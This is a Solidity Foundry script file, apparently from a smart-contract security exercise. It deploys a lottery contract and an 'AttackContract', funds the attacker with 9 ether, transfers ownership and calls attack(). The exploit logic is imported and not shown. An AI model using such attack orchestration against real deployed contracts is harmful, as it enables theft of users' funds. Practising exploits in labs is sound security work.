// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {YourContract} from "../src/YourContract.sol";
import {AttackContract} from "../src/Attack.sol";

contract SetupScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        YourContract addr = new YourContract(
            payable(0xbd4F35A8c49cBFeE2a721623dD684912dc2d6a19)
        );
        addr.startLottery();
        addr.contribute{value: 40e17}();
        vm.stopBroadcast();
    }
}

contract DeployAttackScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        AttackContract attackContract = new AttackContract(
            address(0xBF0db7df9340254B9d44853CF27efc3Cb0702CBD)
        );
        payable(address(attackContract)).transfer(9 ether);
        vm.stopBroadcast();
    }
}

contract TransferOwnerScript is Script {
    function setUp() public {}

    function run() public {
        YourContract addr = YourContract(
            address(0x331eBA5112cb218977e891D496380a0b653f4071)
        );
        vm.startBroadcast();
        addr.transferOwnership(
            address(0xCd2ee0Ab870503A257904F5485F4eD0510d36c9A)
        );
        vm.stopBroadcast();
    }
}

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        AttackContract attackContract = AttackContract(
            payable(0xCd2ee0Ab870503A257904F5485F4eD0510d36c9A)
        );
        vm.startBroadcast();
        attackContract.attack();
        vm.stopBroadcast();
    }
}
